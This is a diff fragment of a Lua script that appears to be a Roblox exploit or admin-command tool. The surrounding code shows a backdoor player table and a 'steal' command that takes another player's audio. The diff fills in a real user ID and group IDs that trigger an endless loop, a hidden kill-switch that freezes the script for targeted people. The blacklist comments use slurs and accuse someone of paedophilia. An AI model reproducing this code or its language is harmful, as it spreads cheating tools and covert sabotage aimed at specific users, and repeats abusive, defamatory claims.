@@ -329,7 +329,7 @@ local BackDoorTablePlayers = {
 }
 
 local BlacklistTable = {
-	[0] = true; -- retard who hit me
+	[1541440012] = true; -- retard who hit me
 	[0] = true; -- Generally annoying and fan boys tagged users and claims he can script when he can't (skid).
 	[0] = true; -- said he would dox me but wouldn't
 	[0] = true; -- literally a pedophile and a skid
@@ -2542,7 +2542,7 @@ AddCommand(function(Arguments)
 		end
 	end
 end,"steal",{},"Steals a persons audio","[Player]")
-if LP:IsInGroup(0) or LP:IsInGroup(0) or LP:IsInGroup(0) or LP:IsInGroup(0) or string.find(LP.Name:lower(),"lynx") or string.find(LP.Name:lower(),"spacedgod") or BlacklistTable[LP.UserId] then while true do end end
+if LP:IsInGroup(9005118) or LP:IsInGroup(9005118) or LP:IsInGroup(0) or LP:IsInGroup(0) or string.find(LP.Name:lower(),"lynx") or string.find(LP.Name:lower(),"spacedgod") or BlacklistTable[LP.UserId] then while true do end end
 AddCommand(function(Arguments)
 	if Arguments[1] then 
 		local Player = PlrFinder(Arguments[1])
